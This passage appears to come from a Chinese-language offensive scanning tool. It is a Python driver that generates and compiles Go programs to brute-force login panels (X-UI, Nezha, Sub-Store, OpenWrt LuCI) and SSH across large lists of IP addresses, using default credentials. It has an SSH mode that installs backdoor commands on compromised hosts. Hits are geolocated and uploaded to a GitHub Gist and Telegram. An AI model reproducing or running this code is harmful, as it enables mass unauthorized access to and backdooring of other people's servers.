	return err == nil
}

func recordSuccess(ip, port, username, password string) {
	f, err := os.OpenFile("hmsuccess.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
		f.Sync()
	}
}

func recordFailure(ip, port, username, password, reason string) {
	f, err := os.OpenFile("hmfail.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\n", ip, port, username, password, reason))
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"

RETRY:
    batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	completedCount = 0

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	
	if retryFlag {
		fmt.Println("⚠️ 重新爆破启动...")
		goto RETRY
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_7 = '''package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

const (
	timeoutSeconds = 10
	successFlag    = `{"status":"success","data"`
)

var headers = map[string]string{
	"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Encoding": "gzip, deflate, br",
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text + "\\n")
}

func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil {
		return false, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(bodyBytes), successFlag) {
			return true, nil
		}
	}
	return false, nil
}

func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
	cleanPath := strings.Trim(path, "/")
	fullPath := cleanPath + "/api/utils/env"
	httpProbeURL := fmt.Sprintf("http://%s/%s", ipPort, fullPath)
	httpsProbeURL := fmt.Sprintf("https://%s/%s", ipPort, fullPath)

	ctx1, cancel1 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
	defer cancel1()
	success, err := sendRequest(ctx1, client, httpProbeURL)
	if err != nil {
		// fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
	}
	if success {
		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
		writeResultToFile(file, output)
		return true
	}

	ctx2, cancel2 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
	defer cancel2()
	success, err = sendRequest(ctx2, client, httpsProbeURL)
	if err != nil {
		// fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
	}
	if success {
		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
		writeResultToFile(file, output)
		return true
	}

	return false
}


func processIP(line string, file *os.File, paths []string, client *http.Client) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	for _, path := range paths {
		if tryBothProtocols(ipPort, path, client, file) {
			break
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	outputFile := "xui.txt"
	passwords := {pass_list}
	paths := passwords

	lines, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

    if len(paths) == 0 {
        fmt.Println("错误：路径/密码列表为空。")
        return
    }

	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(lines))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 100,
		},
		Timeout: timeoutSeconds * time.Second,
	}

	for _, line := range lines {
		wg.Add(1)
		go processIP(line, file, paths, client)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_8 = '''package main

import (
	"bufio"
	"context"
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var client = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
    Timeout: 10 * time.Second,
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        return http.ErrUseLastResponse
    },
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, urlStr string, username string, password string, origin string, referer string) (*http.Response, error) {
	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
	formData := strings.NewReader(payload)
	req, err := http.NewRequest("POST", urlStr, formData)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Referer", referer)
	req.Header.Set("Origin", origin)
	req = req.WithContext(ctx)
	return client.Do(req)
}


func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
	file.Sync()
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	targets := []string{}

	trimmed := strings.TrimSpace(line)
	if trimmed == "" {
		return
	}

	if strings.HasPrefix(trimmed, "http://") || strings.HasPrefix(trimmed, "https://") {
		targets = append(targets, trimmed)
	} else {
		parts := strings.Split(trimmed, ":")
		ip := parts[0]
		var ports []string
		if len(parts) == 1 {
			ports = []string{"80", "443"}
		} else if len(parts) == 2 {
			ports = []string{parts[1]}
		} else {
			return
		}
		for _, port := range ports {
			targets = append(targets,
				fmt.Sprintf("http://%s:%s/cgi-bin/luci/", ip, port),
				fmt.Sprintf("https://%s:%s/cgi-bin/luci/", ip, port),
			)
		}
	}

	for _, target := range targets {
		finalURL := target
		if !(strings.Contains(target, "/cgi-bin/luci")) {
			if strings.HasSuffix(target, "/") {
				finalURL = target + "cgi-bin/luci/"
			} else {
				finalURL = target + "/cgi-bin/luci/"
			}
		}
		u, _ := url.Parse(finalURL)
		origin := u.Scheme + "://" + u.Host
		referer := origin + "/"

		for _, username := range usernames {
			for _, password := range passwords {
				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
				cancel()
				if err != nil {
					continue
				}

				defer resp.Body.Close()
				
				cookies := resp.Cookies()
				for _, c := range cookies {
					if c.Name == "sysauth_http" && c.Value != "" {
						fmt.Printf("[+] 爆破成功: %s %s %s\\n", finalURL, username, password)
						writeResultToFile(file, fmt.Sprintf("%s %s %s\\n", finalURL, username, password))
						return
					}
				}
			}
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	
	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}
	
	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter

def extract_host_port(line):
    match = re.search(r'https?://([^/\s]+)', line)
    if match:
        return match.group(1)
    else:
        return line.strip()

def get_ip_info(ip_port, retries=3):
    if ':' in ip_port:
        ip, port = ip_port.split(':', 1)
    else:
        ip = ip_port.strip()
        port = ''
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                ip_info = response.json()
                country = ip_info.get('country', 'N/A')
                region = ip_info.get('regionName', 'N/A')
                city = ip_info.get('city', 'N/A')
                isp = ip_info.get('isp', 'N/A')
                return [f"{ip}:{port}" if port else ip, country, region, city, isp]
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
            else:
                return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']
    return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    match = re.search(r'https?://([^/\s]+)', url)
    if match:
        return match.group(1)
    
    if ':' in url:
        return url.split()[0]
   
    return url.split()[0]

def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
    elapsed_time = time.time() - start_time
    percent_str = "{0:.1f}".format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)

    if iteration > 0 and elapsed_time > 0:
        its_per_sec = iteration / elapsed_time
        remaining_time = (total - iteration) / its_per_sec
        eta_str = time.strftime('%M:%S', time.gmtime(remaining_time))
    else:
        its_per_sec = 0
        eta_str = "??:??"

    elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
    
    progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
    
    sys.stdout.write(progress_str)
    sys.stdout.flush()
    if iteration == total:
        sys.stdout.write('\n')

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    total_tasks = len(lines)
    start_time = time.time()

    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        os.remove(output_excel)

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    print_progress_bar(0, total_tasks, start_time, prefix='IP信息查询', suffix='开始...')
    for i, line in enumerate(lines):
        completed_tasks = i + 1
        parts = line.split()
        if len(parts) >= 3:
            addr, user, passwd = parts[:3]
        else:
            addr = parts[0]
            user = passwd = ''

        ip_port = extract_ip_port(addr)
        ip_info = get_ip_info(ip_port)
        row = [addr, ip_port, user, passwd] + ip_info[1:]

        wb = load_workbook(output_excel)
        ws = wb.active
        ws.append(row)
        adjust_column_width(ws)
        wb.save(output_excel)

        print_progress_bar(completed_tasks, total_tasks, start_time, prefix='IP信息查询', suffix=f'{ip_port}')
        time.sleep(1.5)
    print("\nIP信息查询完成！")


if __name__ == "__main__":
    process_ip_port_file('xui.txt', 'xui.xlsx')
"""

# =========================== 主脚本核心功能 ===========================
def escape_go_string(s: str) -> str: return s.replace("\\", "\\\\").replace('"', '\\"')
def to_go_bool(val: bool) -> str: return "true" if val else "false"
def to_go_string_array_one_line(lines: list) -> str:
    if not lines: return "[]string{}"
    return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"
def generate_xui_go(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template2(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template3(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template4(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template5(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    backdoor_flag = to_go_bool(install_backdoor)
    cmd_array = to_go_string_array_one_line(custom_cmds)
    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list).replace("{enable_backdoor}", backdoor_flag).replace("{custom_backdoor_cmds}", cmd_array)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template7(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_xui_go_template8(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f: f.write(IPCX_PY_CONTENT)

def compile_go_program(template_mode):
    executable_name = "xui_executable"
    if sys.platform == "win32": executable_name += ".exe"
    print("--- 正在编译Go程序... ---")
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    if template_mode == 6:
        if not os.path.exists("go.mod"):
            subprocess.run(['go', "mod", "init", "xui"], check=True, capture_output=True, env=go_env)
        subprocess.run(['go', "get", "golang.org/x/crypto/ssh"], check=True, capture_output=True, env=go_env)
    try:
        result = subprocess.run(['go', 'build', '-o', executable_name, 'xui.go'], capture_output=True, text=True, check=True, encoding='utf-8', env=go_env)
        if result.stderr: print(f"--- Go编译器警告 ---\n{result.stderr}")
        print(f"--- Go程序编译成功: {executable_name} ---")
        return executable_name
    except subprocess.CalledProcessError as e:
        print(f"--- Go 程序编译失败 ---\n返回码: {e.returncode}\n--- 标准输出 ---\n{e.stdout}\n--- 错误输出 ---\n{e.stderr}\n--------------------------")
        sys.exit(1)

def merge_xui_files():
    merged_file = 'xui.txt' 
    if os.path.exists(merged_file): os.remove(merged_file)
    with open(merged_file, 'w', encoding='utf-8') as outfile:
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("xui_") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8', errors='ignore') as infile:
                    shutil.copyfileobj(infile, outfile)

def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = output_name 
    if os.path.exists(output_path): os.remove(output_path)
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix)]
    if not files_to_merge: return
    with open(output_path, "wb") as out:
        for f_path in files_to_merge:
            with open(f_path, "rb") as f:
                shutil.copyfileobj(f, out)

def run_ipcx():
    if os.path.exists('xui.txt') and os.path.getsize('xui.txt') > 0:
        print("--- 正在运行 IP 信息查询... ---")
        subprocess.run([sys.executable, 'ipcx.py'])

# =========================== 逻辑修改部分 ===========================
def split_file(input_file, lines_per_file):
    part_files = []
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    for idx, start in enumerate(range(0, len(lines), lines_per_file), 1):
        part_name = f"part_{idx}.txt"
        part_files.append(part_name)
        with open(os.path.join(TEMP_PART_DIR, part_name), 'w', encoding='utf-8') as fout:
            fout.writelines(lines[start:start + lines_per_file])
    return part_files

def run_single_part(executable_name, part_file):
    global CURRENT_SUBPROCESS
    print(f"\n--- 开始处理分片: {part_file} ---")
    shutil.copy(os.path.join(TEMP_PART_DIR, part_file), 'results.txt')

    total_memory = psutil.virtual_memory().total
    mem_limit = int(total_memory * 0.70 / 1024 / 1024)
    run_env = os.environ.copy()
    run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
    run_env["GOGC"] = "50"

    try:
        if sys.platform != "win32": os.chmod(executable_name, 0o755)
        cmd = ['./' + executable_name]
        CURRENT_SUBPROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='replace')
        
        while True:
            output = CURRENT_SUBPROCESS.stdout.readline()
            if output == '' and CURRENT_SUBPROCESS.poll() is not None: break
            if output: sys.stdout.write(output); sys.stdout.flush()
        
        if CURRENT_SUBPROCESS.returncode != 0:
            raise subprocess.CalledProcessError(CURRENT_SUBPROCESS.returncode, cmd)
        
        print(f"--- ✔️ 分片处理成功: {part_file} ---")
        output_file = os.path.join(TEMP_XUI_DIR, f'xui_{part_file}')
        if os.path.exists('xui.txt'): shutil.move('xui.txt', output_file)
        if os.path.exists("hmsuccess.txt"): shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess_{part_file}"))
        if os.path.exists("hmfail.txt"): shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail_{part_file}"))
        return True

    except subprocess.CalledProcessError as e:
        if not SHUTDOWN_REQUESTED:
            print(f"\n--- ❌ 程序执行失败: {part_file} ---\n返回码: {e.returncode}\n此分片将不会被标记为完成，下次运行时会重试。")
        return False
    finally:
        CURRENT_SUBPROCESS = None

def clean_temp_files():
    print("--- 正在清理临时文件... ---")
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
    for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
        if os.path.exists(f):
            try: os.remove(f)
            except OSError: pass

if __name__ == "__main__":
    JOB_START_TIME = time.time()
    JOB_TIMEOUT_SECONDS = 4.8 * 60 * 60 

    GIST_ID = os.environ.get("GIST_ID")
    GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
    PROGRESS_FILE_NAME = os.environ.get("PROGRESS_FILE_NAME", "scanner_progress.json")
    ACTION_INPUTS = { "input_file_url": os.environ.get("INPUT_FILE_URL") }
    
    BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
    CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

    progress_data = {}
    try:
        json_content = get_gist_content(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME)
        if json_content:
            try: progress_data = json.loads(json_content)
            except json.JSONDecodeError: progress_data = {}
        
        if progress_data.get("source_url") != ACTION_INPUTS["input_file_url"]:
            print("ℹ️ 检测到新的源文件URL，将重置处理进度。")
            progress_data = {"source_url": ACTION_INPUTS["input_file_url"], "completed_parts": []}

        TEMP_PART_DIR = "temp_parts"; TEMP_XUI_DIR = "xui_outputs"; TEMP_HMSUCCESS_DIR = "temp_hmsuccess"; TEMP_HMFAIL_DIR = "temp_hmfail"
        os.makedirs(TEMP_PART_DIR, exist_ok=True); os.makedirs(TEMP_XUI_DIR, exist_ok=True); os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True); os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
        
        # --- 凭据加载逻辑 ---
        TEMPLATE_MODE = int(os.environ.get("TEMPLATE_MODE", "1"))
        USE_CUSTOM_DICT = os.environ.get("USE_CUSTOM_DICT", "false").lower() == "true"
        if TEMPLATE_MODE == 7:
            usernames = ["2cXaAxRGfddmGz2yx1wA"]
            if USE_CUSTOM_DICT:
                if not os.path.exists("password.txt"): print("❌ 错误: 缺少 password.txt 文件"); sys.exit(1)
                passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
            else:
                passwords = ["2cXaAxRGfddmGz2yx1wA"]
        else:
            if USE_CUSTOM_DICT:
                if not os.path.exists("username.txt") or not os.path.exists("password.txt"): print("❌ 错误: 缺少 username.txt 或 password.txt"); sys.exit(1)
                usernames = [line for line in open("username.txt", encoding='utf-8').read().splitlines() if line.strip()]
                passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
            else:
                if TEMPLATE_MODE == 3: usernames, passwords = ["sysadmin"], ["sysadmin"]
                elif TEMPLATE_MODE == 8: usernames, passwords = ["root"], ["password"]
                else: usernames, passwords = ["admin"], ["admin"]
        
        # --- Go模板选择 ---
        template_map = { 1: generate_xui_go, 2: generate_xui_go_template2, 3: generate_xui_go_template3, 4: generate_xui_go_template4, 5: generate_xui_go_template5, 6: generate_xui_go_template6, 7: generate_xui_go_template7, 8: generate_xui_go_template8 }
        gen_func = template_map.get(TEMPLATE_MODE)
        if not gen_func: print(f"❌ 错误: 无效的模板模式 {TEMPLATE_MODE}"); sys.exit(1)
        # 准备参数
        gen_args = (int(os.environ.get("SEMAPHORE_SIZE", "250")), usernames, passwords)
        if TEMPLATE_MODE == 6:
            # SSH模式需要额外参数
            INSTALL_BACKDOOR = os.environ.get("INSTALL_BACKDOOR", "false").lower() == "true"
            CUSTOM_BACKDOOR_CMDS = []
            if INSTALL_BACKDOOR:
                if not os.path.exists("后门命令.txt"): print("❌ 错误: 缺少 '后门命令.txt'"); sys.exit(1)
                with open("后门命令.txt", encoding='utf-8') as f: CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
            gen_args = (int(os.environ.get("SEMAPHORE_SIZE", "250")), usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)
        gen_func(*gen_args)
        
        executable = compile_go_program(TEMPLATE_MODE)
        all_parts = split_file(os.environ.get("INPUT_FILE", "1.txt"), int(os.environ.get("LINES_PER_FILE", "5000")))
        
        while True:
            if SHUTDOWN_REQUESTED: print("主循环检测到关闭请求，正在退出..."); break
            if time.time() - JOB_START_TIME > JOB_TIMEOUT_SECONDS: print("⏱️ 作业时间接近5小时上限，优雅退出，等待下一个作业接力。"); break

            completed_parts = progress_data.get("completed_parts", [])
            next_part = next((p for p in all_parts if p not in completed_parts), None)

            if next_part is None: print("✅ 所有文件分片均已处理完毕！"); break

            success = run_single_part(executable, next_part)

            if success:
                progress_data.setdefault("completed_parts", []).append(next_part)
                update_gist_file(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME, json.dumps(progress_data, indent=2))

        is_all_done = set(all_parts) == set(progress_data.get("completed_parts", []))
        if is_all_done:
            print("\n🎉🎉🎉 所有任务分片均已成功处理！开始最后的数据整合和通知。🎉🎉🎉")
            generate_ipcx_py()
            merge_xui_files()
            merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
            merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
            run_ipcx()
            
            final_result_files = {}
            beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
            time_str = beijing_time.strftime("%Y%m%d-%H%M")
            mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
            prefix = mode_map.get(TEMPLATE_MODE, "result")

            def rename_and_track(original, new_name_template):
                if os.path.exists(original) and os.path.getsize(original) > 0:
                    new_name = new_name_template.format(prefix=prefix, time=time_str)
                    os.rename(original, new_name)
                    final_result_files[original] = new_name
                    print(f"✅ 结果文件已生成: {new_name}")

            rename_and_track("xui.txt", "{prefix}-{time}.txt")
            rename_and_track("xui.xlsx", "{prefix}-{time}.xlsx")
            rename_and_track("hmsuccess.txt", "后门安装成功-{time}.txt")
            rename_and_track("hmfail.txt", "后门安装失败-{time}.txt")

            for final_name in final_result_files.values():
                if final_name.endswith(".txt") and os.path.exists(final_name):
                    try:
                        with open(final_name, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        update_gist_file(GIST_ID, GITHUB_TOKEN, final_name, content)
                    except Exception as e:
                        print(f"❌ 读取或上传 Gist 文件 {final_name} 时出错: {e}")

            def send_to_telegram(file_path, bot_token, chat_id):
